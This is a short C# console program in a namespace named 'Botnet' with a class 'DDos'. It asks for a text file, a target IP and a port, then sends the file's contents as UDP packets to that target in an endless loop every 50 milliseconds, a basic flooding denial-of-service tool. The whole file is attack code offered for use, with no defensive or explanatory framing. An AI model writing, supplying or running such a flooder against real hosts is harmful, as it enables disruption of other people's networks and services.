using System;
using System.Linq;
using System.Text;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Threading;
using System.Collections.Generic;
using System.Threading.Tasks;

namespace Botnet
{
    class DDos
    {
        DDos()
        {

        }

        public static string ip;
        public static string text;
        public static string txtfile;
        public static int count = 0;
        public static int port;

        public static void Lecture()
        {
            if (GetFile())
            {
                using (StreamReader sr = new StreamReader(txtfile))
                    text = sr.ReadToEnd();

                GetInfo();

                while (true)
                {
                    if (Send())
                    {
                        count++;
                        Console.WriteLine($"{count} Paquets on été envoyés!");
                        Thread.Sleep(50);
                    }
                    else
                    {
                        Console.WriteLine($"Erreur lors de l'envoi de paquets!", ConsoleColor.Red);
                        Thread.Sleep(50);
                    }
                }
            }
            else
            {
                Lecture();
            }
        }


        public static bool GetFile()
        {
            Console.Write("Type the path to your .txt file:");
            txtfile = Console.ReadLine();

            if (File.Exists(txtfile))
                return true;
            else
                return false;
        }

        public static void GetInfo()
        {
            Console.Write("IP:");
            ip = Console.ReadLine();

            Console.Write("Port:");
            port = Convert.ToInt32(Console.ReadLine());
        }

        public static bool Send()
        {
            byte[] packetdata = Encoding.ASCII.GetBytes(text);
            IPEndPoint ep = new IPEndPoint(IPAddress.Parse(ip), port);
            Socket sock = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, ProtocolType.Udp);

            try
            {
                sock.SendTo(packetdata, ep);
                return true;
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.Message);
                return false;
            }
        }

    }
}
